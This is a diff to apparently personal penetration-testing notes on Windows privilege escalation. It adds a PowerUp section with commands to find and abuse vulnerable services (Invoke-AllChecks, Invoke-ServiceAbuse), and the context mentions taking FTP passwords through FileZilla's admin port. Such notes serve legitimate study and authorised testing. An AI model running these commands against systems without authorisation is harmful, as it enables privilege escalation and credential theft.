@@ -21,6 +21,21 @@ netstat -ano
 
 The main thing to look for with Active Network Connections are entries listening on loopback addresses (127.0.0.1 and ::1) that are not listening on the IP Address (10.129.43.8) or broadcast (0.0.0.0, ::/0).
 
+## PowerUp
+
+Download from PowerSploit Github repo: [https://github.com/ZeroDayLab/PowerSploit](https://github.com/ZeroDayLab/PowerSploit).
+
+```powershell
+# Import the module
+Import-Module .\PowerUp.ps1
+
+# Find services vulnerables in my machine
+Invoke-AllChecks
+
+# Exploit a vulnerable service to escalate to the more privilege user that runs that service
+Invoke-ServiceAbuse -Name ‘<NAME OF THE SERVICE>’ -UserName ‘<DOMAIN CONTROLLER>\<MY CURRENT USERNAME>’
+```
+
 ## Filezilla on port 14147
 
 If we see  port `14147`, which is used for FileZilla's administrative interface, we could connect to this port, and possibly extract FTP passwords in addition to creating an FTP Share at c:\ as the FileZilla Server user (potentially Administrator).
